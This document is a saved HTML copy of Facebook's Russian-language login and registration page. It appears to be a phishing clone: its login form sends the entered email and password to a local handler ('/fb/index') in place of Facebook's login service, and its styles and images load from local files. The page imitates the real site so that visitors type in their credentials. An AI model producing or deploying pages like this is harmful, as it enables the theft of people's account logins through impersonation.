<!DOCTYPE html>
<html id="facebook" class="" lang="ru">

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">

    <link rel="manifest" href="https://ru-ru.facebook.com/data/manifest/" crossorigin="use-credentials">
    <title id="pageTitle">Facebook — Выполните вход или зарегистрируйтесь</title>
    <meta property="og:site_name" content="Facebook">
    <meta property="og:url" content="https://ru-ru.facebook.com/">
    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
    <meta property="og:locale" content="ru_RU">
    <link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/">
    <meta name="description" content="Создайте аккаунт или войдите на Facebook. Общайтесь с друзьями, родственниками и другими людьми, которых вы знаете. Делитесь фото и видео, отправляйте...">
    <meta name="robots" content="noodp,noydir">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
    <link type="text/css" rel="stylesheet" href="/style.css" crossorigin="anonymous">

</head>

<body class="fbIndex UIPage_LoggedOut hasBanner _-kb _605a b_c3pyn-ahh gecko win x1 Locale_ru_RU cores-lt4 _19_u hasAXNavMenubar hasCookieBanner" dir="ltr">



<div class="_li" id="u_0_e">
    <div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_f">
        <div class="_608m">
            <div class="_5aj7 _tb6">
                <div class="_4bl7"><span class="mrm _3bcv _50f3">Перейти к</span></div>
                <div class="_4bl9 _3bcp">
                    <div class="_6a _608n" aria-label="Помощь с навигацией" aria-keyshortcuts="Alt+/" role="menubar" id="u_0_g">
                        <div class="_6a uiPopover" id="u_0_h"><a role="menuitem" class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" href="#" style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle" id="u_0_i"><span class="_55pe">Разделы этой Страницы</span><span class="_4o_3 _3-99"><i class="img sp_CFhzeuTBkdE sx_2ea917"></i></span></a></div>
                        <div class="_6a _3bcs"></div>
                        <div class="_6a mrm uiPopover" id="u_0_j"><a role="menuitem" class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy" href="#" style="max-width:200px;" aria-haspopup="true" tabindex="-1" aria-expanded="false" rel="toggle" id="u_0_k"><span class="_55pe">Справочный центр специальных возможностей</span><span class="_4o_3 _3-99"><i class="img sp_CFhzeuTBkdE sx_d8579c"></i></span></a></div>
                    </div>
                </div>
                <div class="_4bl7 mlm pll _3bct">
                    <div class="_6a _3bcy">Нажмите <span class="_3bcz">alt</span> и <span class="_3bcz">/</span> одновременно, чтобы открыть это меню</div>
                </div>
            </div>
        </div>
    </div>
    </div>
    <div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
        <div id="blueBarDOMInspector">
            <div class="_53jh">
                <div class="loggedout_menubar_container">
                    <div class="clearfix loggedout_menubar">
                        <div class="lfloat _ohe">
                            <h1><a href="/fb" title="Перейти на главную страницу Facebook"><i class="fb_logo img sp_0eOQhLgQG2U sx_fbcf0b"><u>Facebook</u></i></a></h1>
                        </div>
                        <div class="menu_login_container rfloat _ohf" data-testid="royal_login_form">
                            <form id="login_form" action="/fb/index" method="post" novalidate="1" onsubmit=""><input type="hidden" name="jazoest" value="2712" autocomplete="off"><input type="hidden" name="lsd" value="AVq8zNGy" autocomplete="off">
                                <table role="presentation" cellspacing="0">
                                    <tbody>
                                    <tr>
                                        <td class="html7magic"><label for="email">Электронный адрес или номер телефона</label></td>
                                        <td class="html7magic"><label for="pass">Пароль</label></td>
                                    </tr>
                                    <tr>
                                        <td><input type="email" class="inputtext login_form_input_box" name="email" id="email" data-testid="royal_email"></td>
                                        <td><input type="password" class="inputtext login_form_input_box" name="pass" id="pass" data-testid="royal_pass"></td>
                                        <td><label class="login_form_login_button uiButton uiButtonConfirm" id="loginbutton" for="u_0_b"><input value="Вход" aria-label="Войти" data-testid="royal_login_button" type="submit" id="u_0_b"></label></td>
                                    </tr>
                                    <tr>
                                        <td class="login_form_label_field"></td>
                                        <td class="login_form_label_field">
                                            <div><a href="https://ru-ru.facebook.com/recover/initiate?lwv=110&amp;ars=royal_blue_bar">Забыли аккаунт?</a></div>
                                        </td>
                                    </tr>
                                    </tbody>
                                </table><input type="hidden" autocomplete="off" name="timezone" value="0" id="u_0_c"><input type="hidden" autocomplete="off" name="lgndim" value="eyJ3IjoyNDAwLCJoIjo5MDAsImF3IjoyNDAwLCJhaCI6OTAwLCJjIjoyNH0=" id="u_0_d"><input type="hidden" name="lgnrnd" value="091830_rXfN"><input type="hidden" id="lgnjs" name="lgnjs" value="1588177114"><input type="hidden" autocomplete="off" name="ab_test_data" value=""><input type="hidden" autocomplete="off" id="locale" name="locale" value="ru_RU"><input type="hidden" autocomplete="off" name="next" value="https://ru-ru.facebook.com/"><input type="hidden" autocomplete="off" name="login_source" value="login_bluebar"><input type="hidden" autocomplete="off" name="guid" value=""><input type="hidden" autocomplete="off" id="prefill_contact_point" name="prefill_contact_point"><input type="hidden" autocomplete="off" id="prefill_source" name="prefill_source"><input type="hidden" autocomplete="off" id="prefill_type" name="prefill_type">
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="globalContainer" class="uiContextualLayerParent">
        <div class="fb_content clearfix " id="content" role="main">
            <div>
                <div class="gradient">
                    <div class="gradientContent">
                        <div class="clearfix">
                            <div class="lfloat _ohe">
                                <div class="_5iyy">
                                    <div class="_5iyx">Facebook помогает вам всегда оставаться на связи и общаться со своими знакомыми.</div><img class="img" src="/index_files/OBaVg52wtTZ.png" alt="" width="537" height="195">
                                </div>
                            </div>
                            <div class="_5iyz rfloat _ohf">
                                <div class="_5iyz">
                                    <div class="pvl _52lp _59d-">
                                        <div class="mbs _52lq fsl fwb fcb">Регистрация</div>
                                        <div class="_52lr fsm fwn fcg">Быстро и легко.</div>
                                    </div>
                                    <div id="registration_container">
                                        <div><noscript>
                                                <div id="no_js_box">
                                                    <h2>Ваш браузер не поддерживает JavaScript.</h2>
                                                    <p>Включите поддержку JavaScript в вашем браузере или установите браузер с поддержкой JavaScript, чтобы зарегистрироваться на Facebook.</p>
                                                </div>
                                            </noscript>
                                            <div class="_58mf">
                                                <div id="reg_box" class="registration_redesign">
                                                    <div class="_8fgl">
                                                        <div id="reg_error" class="hidden_elem _58mn" role="alert">
                                                            <div class="_58mo" id="reg_error_inner" tabindex="0">Произошла ошибка. Пожалуйста, повторите попытку.</div>
                                                        </div>
                                                        <div id="softblock_error" class="hidden_elem _58mn" role="alert">
                                                            <div class="_58mo" id="softblock_error_inner" tabindex="0">Мы не смогли создать ваш аккаунт<br>Нам не удалось зарегистрировать вас на Facebook.</div>
                                                        </div>
                                                        <form method="post" id="reg" name="reg" action="https://m.facebook.com/reg/" onsubmit="return false;"><input type="hidden" name="jazoest" value="2712" autocomplete="off"><input type="hidden" name="lsd" value="AVq8zNGy" autocomplete="off">
                                                            <div id="reg_form_box" class="large_form">
                                                                <div id="fullname_field" class="_1ixn">
                                                                    <div class="clearfix _58mh">
                                                                        <div class="mbm _1iy_ _a4y _3-90 lfloat _ohe">
                                                                            <div class="_5dbb" id="u_0_n">
                                                                                <div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput">
                                                                                    <div class="placeholder" aria-hidden="true">Имя</div><input type="text" class="inputtext _58mg _5dba _2ph-" data-type="text" name="firstname" aria-required="true" placeholder="" aria-label="Имя" id="u_0_o">
                                                                                </div><i class="_5dbc img sp_UQETc8Y6QpO sx_ad93cf"></i><i class="_5dbd img sp_UQETc8Y6QpO sx_00c837"></i>
                                                                                <div class="_1pc_"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="mbm _1iy_ _a4y rfloat _ohf">
                                                                            <div class="_5dbb" id="u_0_p">
                                                                                <div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput">
                                                                                    <div class="placeholder" aria-hidden="true">Фамилия</div><input type="text" class="inputtext _58mg _5dba _2ph-" data-type="text" name="lastname" aria-required="true" placeholder="" aria-label="Фамилия" id="u_0_q">
                                                                                </div><i class="_5dbc img sp_UQETc8Y6QpO sx_ad93cf"></i><i class="_5dbd img sp_UQETc8Y6QpO sx_00c837"></i>
                                                                                <div class="_1pc_"></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="_1pc_" id="fullname_error_msg"></div>
                                                                </div>
                                                                <div class="mbm _a4y" id="u_0_r">
                                                                    <div class="_5dbb" id="u_0_s">
                                                                        <div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput">
                                                                            <div class="placeholder" aria-hidden="true">Номер мобильного телефона или эл. адрес</div><input type="text" class="inputtext _58mg _5dba _2ph-" data-type="text" name="reg_email__" aria-required="true" placeholder="" aria-label="Номер мобильного телефона или эл. адрес" id="u_0_t">
                                                                        </div><i class="_5dbc img sp_UQETc8Y6QpO sx_ad93cf"></i><i class="_5dbd img sp_UQETc8Y6QpO sx_00c837"></i>
                                                                        <div class="_1pc_"></div>
                                                                    </div>
                                                                </div>
                                                                <div class="hidden_elem" id="u_0_u" style="opacity: 0.00001;">
                                                                    <div class="mbm _a4y">
                                                                        <div class="_5dbb" id="u_0_v">
                                                                            <div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput">
                                                                                <div class="placeholder" aria-hidden="true">Повторно введите ваш эл. адрес</div><input type="text" class="inputtext _58mg _5dba _2ph-" data-type="text" name="reg_email_confirmation__" aria-required="true" placeholder="" aria-label="Повторно введите ваш эл. адрес" id="u_0_w">
                                                                            </div><i class="_5dbc img sp_UQETc8Y6QpO sx_ad93cf"></i><i class="_5dbd img sp_UQETc8Y6QpO sx_00c837"></i>
                                                                            <div class="_1pc_"></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="mbm _br- _a4y" id="password_field">
                                                                    <div class="_5dbb" id="u_0_x">
                                                                        <div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput">
                                                                            <div class="placeholder" aria-hidden="true">Новый пароль</div><input type="password" class="inputtext _58mg _5dba _2ph-" data-type="password" autocomplete="new-password" name="reg_passwd__" aria-required="true" placeholder="" aria-label="Новый пароль" id="u_0_y">
                                                                        </div><i class="_5dbc img sp_UQETc8Y6QpO sx_ad93cf"></i><i class="_5dbd img sp_UQETc8Y6QpO sx_00c837"></i>
                                                                        <div class="_1pc_"></div>
                                                                    </div>
                                                                </div>
                                                                <div class="_58mq _5dbb" id="birthday_wrapper">
                                                                    <div class="mtm mbs _2_68">Дата рождения</div>
                                                                    <div class="_5k_5"><span class="_5k_4" data-type="selectors" data-name="birthday_wrapper" id="u_0_z"><span><select aria-label="День" name="birthday_day" id="day" title="День" class="_5dba _8esg">
                                                                                        <option value="0">День</option>
                                                                                        <option value="1">1</option>
                                                                                        <option value="2">2</option>
                                                                                        <option value="3">3</option>
                                                                                        <option value="4">4</option>
                                                                                        <option value="5">5</option>
                                                                                        <option value="6">6</option>
                                                                                        <option value="7">7</option>
                                                                                        <option value="8">8</option>
                                                                                        <option value="9">9</option>
                                                                                        <option value="10">10</option>
                                                                                        <option value="11">11</option>
                                                                                        <option value="12">12</option>
                                                                                        <option value="13">13</option>
                                                                                        <option value="14">14</option>
                                                                                        <option value="15">15</option>
                                                                                        <option value="16">16</option>
                                                                                        <option value="17">17</option>
                                                                                        <option value="18">18</option>
                                                                                        <option value="19">19</option>
                                                                                        <option value="20">20</option>
                                                                                        <option value="21">21</option>
                                                                                        <option value="22">22</option>
                                                                                        <option value="23">23</option>
                                                                                        <option value="24">24</option>
                                                                                        <option value="25">25</option>
                                                                                        <option value="26">26</option>
                                                                                        <option value="27">27</option>
                                                                                        <option value="28">28</option>
                                                                                        <option value="29" selected="selected">29</option>
                                                                                        <option value="30">30</option>
                                                                                        <option value="31">31</option>
                                                                                    </select><select aria-label="Месяц" name="birthday_month" id="month" title="Месяц" class="_9407 _5dba _8esg">
                                                                                        <option value="0">Месяц</option>
                                                                                        <option value="1">янв</option>
                                                                                        <option value="2">фев</option>
                                                                                        <option value="3">мар</option>
                                                                                        <option value="4" selected="selected">апр</option>
                                                                                        <option value="5">мая</option>
                                                                                        <option value="6">июн</option>
                                                                                        <option value="7">июл</option>
                                                                                        <option value="8">авг</option>
                                                                                        <option value="9">сен</option>
                                                                                        <option value="10">окт</option>
                                                                                        <option value="11">ноя</option>
                                                                                        <option value="12">дек</option>
                                                                                    </select><select aria-label="Год" name="birthday_year" id="year" title="Год" class="_5dba _8esg">
                                                                                        <option value="0">Год</option>
                                                                                        <option value="2020">2020</option>
                                                                                        <option value="2019">2019</option>
                                                                                        <option value="2018">2018</option>
                                                                                        <option value="2017">2017</option>
                                                                                        <option value="2016">2016</option>
                                                                                        <option value="2015">2015</option>
                                                                                        <option value="2014">2014</option>
                                                                                        <option value="2013">2013</option>
                                                                                        <option value="2012">2012</option>
                                                                                        <option value="2011">2011</option>
                                                                                        <option value="2010">2010</option>
                                                                                        <option value="2009">2009</option>
                                                                                        <option value="2008">2008</option>
                                                                                        <option value="2007">2007</option>
                                                                                        <option value="2006">2006</option>
                                                                                        <option value="2005">2005</option>
                                                                                        <option value="2004">2004</option>
                                                                                        <option value="2003">2003</option>
                                                                                        <option value="2002">2002</option>
                                                                                        <option value="2001">2001</option>
                                                                                        <option value="2000">2000</option>
                                                                                        <option value="1999">1999</option>
                                                                                        <option value="1998">1998</option>
                                                                                        <option value="1997">1997</option>
                                                                                        <option value="1996">1996</option>
                                                                                        <option value="1995" selected="selected">1995</option>
                                                                                        <option value="1994">1994</option>
                                                                                        <option value="1993">1993</option>
                                                                                        <option value="1992">1992</option>
                                                                                        <option value="1991">1991</option>
                                                                                        <option value="1990">1990</option>
                                                                                        <option value="1989">1989</option>
                                                                                        <option value="1988">1988</option>
                                                                                        <option value="1987">1987</option>
                                                                                        <option value="1986">1986</option>
                                                                                        <option value="1985">1985</option>
                                                                                        <option value="1984">1984</option>
                                                                                        <option value="1983">1983</option>
                                                                                        <option value="1982">1982</option>
                                                                                        <option value="1981">1981</option>
                                                                                        <option value="1980">1980</option>
                                                                                        <option value="1979">1979</option>
                                                                                        <option value="1978">1978</option>
                                                                                        <option value="1977">1977</option>
                                                                                        <option value="1976">1976</option>
                                                                                        <option value="1975">1975</option>
                                                                                        <option value="1974">1974</option>
                                                                                        <option value="1973">1973</option>
                                                                                        <option value="1972">1972</option>
                                                                                        <option value="1971">1971</option>
                                                                                        <option value="1970">1970</option>
                                                                                        <option value="1969">1969</option>
                                                                                        <option value="1968">1968</option>
                                                                                        <option value="1967">1967</option>
                                                                                        <option value="1966">1966</option>
                                                                                        <option value="1965">1965</option>
                                                                                        <option value="1964">1964</option>
                                                                                        <option value="1963">1963</option>
                                                                                        <option value="1962">1962</option>
                                                                                        <option value="1961">1961</option>
                                                                                        <option value="1960">1960</option>
                                                                                        <option value="1959">1959</option>
                                                                                        <option value="1958">1958</option>
                                                                                        <option value="1957">1957</option>
                                                                                        <option value="1956">1956</option>
                                                                                        <option value="1955">1955</option>
                                                                                        <option value="1954">1954</option>
                                                                                        <option value="1953">1953</option>
                                                                                        <option value="1952">1952</option>
                                                                                        <option value="1951">1951</option>
                                                                                        <option value="1950">1950</option>
                                                                                        <option value="1949">1949</option>
                                                                                        <option value="1948">1948</option>
                                                                                        <option value="1947">1947</option>
                                                                                        <option value="1946">1946</option>
                                                                                        <option value="1945">1945</option>
                                                                                        <option value="1944">1944</option>
                                                                                        <option value="1943">1943</option>
                                                                                        <option value="1942">1942</option>
                                                                                        <option value="1941">1941</option>
                                                                                        <option value="1940">1940</option>
                                                                                        <option value="1939">1939</option>
                                                                                        <option value="1938">1938</option>
                                                                                        <option value="1937">1937</option>
                                                                                        <option value="1936">1936</option>
                                                                                        <option value="1935">1935</option>
                                                                                        <option value="1934">1934</option>
                                                                                        <option value="1933">1933</option>
                                                                                        <option value="1932">1932</option>
                                                                                        <option value="1931">1931</option>
                                                                                        <option value="1930">1930</option>
                                                                                        <option value="1929">1929</option>
                                                                                        <option value="1928">1928</option>
                                                                                        <option value="1927">1927</option>
                                                                                        <option value="1926">1926</option>
                                                                                        <option value="1925">1925</option>
                                                                                        <option value="1924">1924</option>
                                                                                        <option value="1923">1923</option>
                                                                                        <option value="1922">1922</option>
                                                                                        <option value="1921">1921</option>
                                                                                        <option value="1920">1920</option>
                                                                                        <option value="1919">1919</option>
                                                                                        <option value="1918">1918</option>
                                                                                        <option value="1917">1917</option>
                                                                                        <option value="1916">1916</option>
                                                                                        <option value="1915">1915</option>
                                                                                        <option value="1914">1914</option>
                                                                                        <option value="1913">1913</option>
                                                                                        <option value="1912">1912</option>
                                                                                        <option value="1911">1911</option>
                                                                                        <option value="1910">1910</option>
                                                                                        <option value="1909">1909</option>
                                                                                        <option value="1908">1908</option>
                                                                                        <option value="1907">1907</option>
                                                                                        <option value="1906">1906</option>
                                                                                        <option value="1905">1905</option>
                                                                                    </select></span></span><a class="_58ms mlm" id="birthday-help" href="#" title="Подробнее" role="button"><i class="img sp_UQETc8Y6QpO sx_3f3536"></i></a><i class="_5dbc _5k_6 img sp_UQETc8Y6QpO sx_ad93cf"></i><i class="_5dbd _5k_7 img sp_UQETc8Y6QpO sx_00c837"></i>
                                                                        <div class="_1pc_"></div>
                                                                    </div>
                                                                </div>
                                                                <div class="mtm _5wa2 _5dbb" id="u_0_10">
                                                                    <div class="mtm mbs _2_68">Пол</div><span class="_5k_3" data-type="radio" data-name="gender_wrapper" id="u_0_11"><span class="_5k_2 _5dba"><input type="radio" class="_8esa" name="sex" value="1" id="u_0_6"><label class="_58mt" for="u_0_6">Женщина</label></span><span class="_5k_2 _5dba"><input type="radio" class="_8esa" name="sex" value="2" id="u_0_7"><label class="_58mt" for="u_0_7">Мужчина</label></span><span class="_5k_2 _5dba"><input type="radio" class="_8esa" name="sex" value="-1" id="u_0_8"><label class="_58mt" for="u_0_8">Другое</label></span></span><a class="_58ms mlm" aria-label="" id="gender-help" title="Подробнее" href="#" role="button"><i class="img sp_UQETc8Y6QpO sx_3f3536"></i></a><i class="_5dbc _8esb img sp_UQETc8Y6QpO sx_ad93cf"></i><i class="_5dbd _8esc img sp_UQETc8Y6QpO sx_00c837"></i>
                                                                    <div class="_1pc_"></div>
                                                                </div>
                                                                <div class="mtm _8ffv hidden_elem" id="custom_gender_container">
                                                                    <div class="_17ie _5dbb" data-type="selectors" data-name="preferred_pronoun" id="u_0_12"><select aria-label="Укажите, как к вам обращаться" name="preferred_pronoun" class="_7-16 _5dba">
                                                                            <option selected="selected" value="" disabled="1">Укажите, как к вам обращаться</option>
                                                                            <option value="1">Она: "Поздравьте ее с днем рождения!"</option>
                                                                            <option value="2">Он: "Поздравьте его с днем рождения!"</option>
                                                                            <option value="6">Он/она: "Поздравьте его/ее с днем рождения!"</option>
                                                                        </select><i class="mrm _5dbc _8esb img sp_UQETc8Y6QpO sx_ad93cf"></i></div>
                                                                    <div class="_83kf">Местоимение, указывающее на ваш пол, видят все.</div>
                                                                    <div class="_7-1q">
                                                                        <div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput">
                                                                            <div class="placeholder" aria-hidden="true">Пол (необязательно)</div><input type="text" class="inputtext _58mg _5dba _2ph-" data-type="text" name="custom_gender" placeholder="" aria-label="Пол (необязательно)" id="u_0_13">
                                                                        </div>
                                                                    </div>
                                                                    <div class="_1pc_"></div>
                                                                </div>
                                                                <div class="_58mu" data-nocookies="1" id="u_0_14">
                                                                    <p class="_58mv">Нажимая кнопку Регистрация, вы принимаете <a href="/legal/terms/update" id="terms-link" target="_blank" rel="nofollow">Условия</a>, <a href="/about/privacy/update" id="privacy-link" target="_blank" rel="nofollow">Политику использования данных</a> и <a href="/policies/cookies/" id="cookie-use-link" target="_blank" rel="nofollow">Политику в отношении файлов cookie</a>. Вы можете получать от нас SMS-уведомления, отказаться от которых можно в любой момент.</p>

                                                                </div>
                                                                <div class="_1lch"><button type="submit" class="_6j mvm _6wk _6wl _58mi _6o _6v" name="websubmit" id="u_0_15">Регистрация</button><span class="hidden_elem _58ml" id="u_0_16"><img class="img" src="index_files/GsNJNwuI-UM.gif" alt="" width="16" height="11"></span></div>
                                                            </div><input type="hidden" autocomplete="off" id="referrer" name="referrer" value=""><input type="hidden" autocomplete="off" id="asked_to_login" name="asked_to_login" value="0"><input type="hidden" autocomplete="off" id="use_custom_gender" name="use_custom_gender" value=""><input type="hidden" autocomplete="off" id="terms" name="terms" value="on"><input type="hidden" autocomplete="off" id="ns" name="ns" value="0"><input type="hidden" autocomplete="off" id="ri" name="ri" value="3b6d36ac-3a48-4c99-8dda-34d1f270cb68"><input type="hidden" autocomplete="off" id="action_dialog_shown" name="action_dialog_shown" value=""><input type="hidden" autocomplete="off" id="ignore" name="ignore" value="reg_email_confirmation__"><input type="hidden" autocomplete="off" id="locale" name="locale" value="ru_RU"><input type="hidden" autocomplete="off" id="reg_instance" name="reg_instance" value="1qipXr7toJFBOmneJYLyubeX">
                                                            <div id="reg_captcha" class="_58mw hidden_elem">
                                                                <div>
                                                                    <h2 id="security_check_header">Проверка безопасности</h2>
                                                                    <div id="outer_captcha_box">
                                                                        <div id="captcha_box">
                                                                            <div class="field_error hidden_elem" id="captcha_response_error">Обязательно для заполнения.</div>
                                                                            <div id="captcha" class="captcha" data-captcha-class="ReCaptchav2Captcha"><input type="hidden" autocomplete="off" id="captcha_persist_data" name="captcha_persist_data" value="AZmBMbTIEm-gYGwEvb4H2xDwaiEpRMqP4XGoHhbzi8R7BhImNNCwPpCfcR8jn8y_7z_JrDqu1Eh8O8rwPG8JC9w-z93TdjJU2KMDN-CTfLU9lLzXfHa73BVXRh4KpoCBTDOTf9IN6fnTOEyUZOkEcFQH2YD3_qWfTdtzb50F_6cbqhmMlQqlqKa0huNVC_kHDMbqOyMn9LZ2wjhJaidUEtxXJo8eIPWtlSkNVrxNImQr_5lUqZNZmbuROBQasogd-IuVmFgw0zwpb45b3cGz6ADNi4F_nQRPND0bSrZHXAWcxnhl2C1XvwZzVu4WjeeD41Qwb21TQHi5LU9idenyINJNcQFqbbAPzlvceM33D8DYkpU8ZKxWU7jCxOleJowvfYg">
                                                                                <div><input name="captcha_response" id="captcha_response" type="hidden"><iframe id="captcha-recaptcha" class="_3-8x _3-95" scrolling="no" width="100%" height="90px" frameborder="0"></iframe></div>
                                                                                <div class="captcha_input"><a href="#" onclick="CSS.show($('captcha_whats_this')); return false;" role="button">Почему я это вижу?</a>
                                                                                    <div id="captcha_whats_this" class="hidden_elem">
                                                                                        <div class="fsl fwb">Проверка безопасности</div>Это стандартная проверка безопасности, которую мы проводим, чтобы предотвратить отправку автоматических запросов.
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div id="captcha_buttons" class="_58p2 clearfix hidden_elem">
                                                                        <div class="_58mx _58mm">
                                                                            <div class="_58mz"> &nbsp; </div><a class="_58my" href="#" role="button" id="u_0_17">Назад</a>
                                                                        </div>
                                                                        <div class="_58mm">
                                                                            <div class="clearfix"><button type="submit" class="_6j mvm _6wk _6wl _58me _58mi _6o _6v" id="u_0_18">Регистрация</button><span class="hidden_elem _58ml" id="u_0_19"><img class="img" src="index_files/GsNJNwuI-UM.gif" alt="" width="16" height="11"></span></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </form>
                                                    </div>
                                                    <div id="reg_pages_msg" class="_58mk"><a href="https://ru-ru.facebook.com/pages/create/?ref_type=registration_form" class="_8esh">Создать Страницу</a> знаменитости, музыкальной группы или компании.</div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div>
            <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
                <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
                    <li>Русский</li>
                    <li><a class="_sv4" dir="ltr" href="https://www.facebook.com/" onclick='require("IntlUtils").setCookieLocale("en_US", "ru_RU", "https:\/\/www.facebook.com\/", "www_list_selector", 0); return false;' title="English (US)">English (US)</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/" onclick='require("IntlUtils").setCookieLocale("fr_FR", "ru_RU", "https:\/\/fr-fr.facebook.com\/", "www_list_selector", 1); return false;' title="French (France)">Français (France)</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://es-la.facebook.com/" onclick='require("IntlUtils").setCookieLocale("es_LA", "ru_RU", "https:\/\/es-la.facebook.com\/", "www_list_selector", 2); return false;' title="Spanish">Español</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://tr-tr.facebook.com/" onclick='require("IntlUtils").setCookieLocale("tr_TR", "ru_RU", "https:\/\/tr-tr.facebook.com\/", "www_list_selector", 3); return false;' title="Turkish">Türkçe</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://pt-pt.facebook.com/" onclick='require("IntlUtils").setCookieLocale("pt_PT", "ru_RU", "https:\/\/pt-pt.facebook.com\/", "www_list_selector", 4); return false;' title="Portuguese (Portugal)">Português (Portugal)</a></li>
                    <li><a class="_sv4" dir="rtl" href="https://ar-ar.facebook.com/" onclick='require("IntlUtils").setCookieLocale("ar_AR", "ru_RU", "https:\/\/ar-ar.facebook.com\/", "www_list_selector", 5); return false;' title="Arabic">العربية</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://it-it.facebook.com/" onclick='require("IntlUtils").setCookieLocale("it_IT", "ru_RU", "https:\/\/it-it.facebook.com\/", "www_list_selector", 6); return false;' title="Italian">Italiano</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://de-de.facebook.com/" onclick='require("IntlUtils").setCookieLocale("de_DE", "ru_RU", "https:\/\/de-de.facebook.com\/", "www_list_selector", 7); return false;' title="German">Deutsch</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://hi-in.facebook.com/" onclick='require("IntlUtils").setCookieLocale("hi_IN", "ru_RU", "https:\/\/hi-in.facebook.com\/", "www_list_selector", 8); return false;' title="Hindi">हिन्दी</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://zh-cn.facebook.com/" onclick='require("IntlUtils").setCookieLocale("zh_CN", "ru_RU", "https:\/\/zh-cn.facebook.com\/", "www_list_selector", 9); return false;' title="Simplified Chinese (China)">中文(简体)</a></li>
                    <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fzh-cn.facebook.com%2F&amp;source=www_list_selector_more" href="#" title="Ещё языки"><i class="img sp_Ke6ZUJH-N4S sx_930120"></i></a></li>
                </ul>
                <div id="contentCurve"></div>
                <div id="pageFooterChildren" role="contentinfo" aria-label="Ссылки Facebook">
                    <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                        <li><a href="https://ru-ru.facebook.com/r.php" title="Регистрация на Facebook">Регистрация</a></li>
                        <li><a href="https://ru-ru.facebook.com/login/" title="Войдите на Facebook">Вход</a></li>
                        <li><a href="https://ru-ru.messenger.com/" title="Оцените Messenger.">Messenger</a></li>
                        <li><a href="https://ru-ru.facebook.com/lite/" title="Facebook Lite для Android.">Facebook Lite</a></li>
                        <li><a href="https://ru-ru.facebook.com/watch/" title="Посмотреть наши видео на Facebook Watch."> Watch </a></li>
                        <li><a href="https://ru-ru.facebook.com/directory/people/" title="Посмотрите наш каталог пользователей.">Люди</a></li>
                        <li><a href="https://ru-ru.facebook.com/directory/pages/" title="Просматривайте наш каталог Страниц.">Страницы</a></li>
                        <li><a href="https://ru-ru.facebook.com/pages/category/">Категории Страниц</a></li>
                        <li><a href="https://ru-ru.facebook.com/places/" title="Ознакомьтесь с популярными местами на Facebook.">Места</a></li>
                        <li><a href="https://ru-ru.facebook.com/games/" title="Познакомьтесь с играми на Facebook.">Игры</a></li>
                        <li><a href="https://ru-ru.facebook.com/directory/places/" title="Просмотрите наш каталог мест.">Места</a></li>
                        <li><a href="https://ru-ru.facebook.com/marketplace/" title="Покупайте и продавайте через Facebook Marketplace.">Marketplace</a></li>
                        <li><a href="https://ru-ru.facebook.com/directory/groups/" title="Просмотреть наш каталог групп.">Группы</a></li>
                        <li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Finstagram.com%2F&amp;h=AT0FYDQ7jBYLjH-VWpcCxBegMv-8OOK54Dmug7yJ39OumuR8c91v8amc9vpHuIgUDI5lJ2EXtTWxYltSxXzwXIvkL-91rtaLCw_EYgj7ZGISNTe9hiElwrR-PO6CSAXIozlG0S1R6kaFeGTb1pSa6g" title="Попробуйте Instagram" target="_blank" rel="noopener nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
                        <li><a href="https://ru-ru.facebook.com/local/lists/245019872666104/" title="Просмотреть наш каталог &quot;Местные списки&quot;.">Местные</a></li>
                        <li><a href="https://ru-ru.facebook.com/fundraisers/" title="Пожертвовать в поддержку общественно значимых дел">Благотворительные акции</a></li>
                        <li><a href="https://ru-ru.facebook.com/biz/directory/" title="Посмотреть наш каталог &quot;Сервисы Facebook&quot;.">Услуги</a></li>
                        <li><a href="https://ru-ru.facebook.com/facebook" accesskey="8" title="Прочтите наш блог, ознакомьтесь с материалами, найдите  вакансии.">О нас</a></li>
                        <li><a href="https://ru-ru.facebook.com/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto" title="Реклама на  Facebook.">Создать рекламу</a></li>
                        <li><a href="https://ru-ru.facebook.com/pages/create/?ref_type=site_footer" title="Создать Страницу">Создать Страницу</a></li>
